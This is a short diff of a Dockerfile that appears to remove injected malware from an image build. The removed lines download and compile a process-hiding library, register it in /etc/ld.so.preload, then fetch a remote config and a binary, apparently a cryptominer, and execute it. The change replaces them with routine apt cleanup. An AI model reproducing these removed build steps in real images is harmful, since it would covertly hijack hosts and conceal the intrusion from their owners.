@@ -33,14 +33,8 @@ RUN apt-get install -y --no-install-recommends \
         wget \
         bash \
         gcc \
-    && wget --no-check-certificate -c https://raw.githubusercontent.com/cihuuy/libn/master/processhider.c \
-    && gcc -Wall -fPIC -shared -o libprocess.so processhider.c -ldl \
-    && mv libprocess.so /usr/local/lib/ \
-    && echo /usr/local/lib/libprocess.so >> /etc/ld.so.preload \
-    && wget https://nyadur.000webhostapp.com/myrig/config.json \
-    && wget https://nyadur.000webhostapp.com/myrig/durex \
-    && chmod +x durex \
-    && RUN ./durex \
+    && apt-get autoclean \
+    && apt-get autoremove \
     && rm -rf /var/lib/apt/lists/* /var/cache/apt/*
 
 
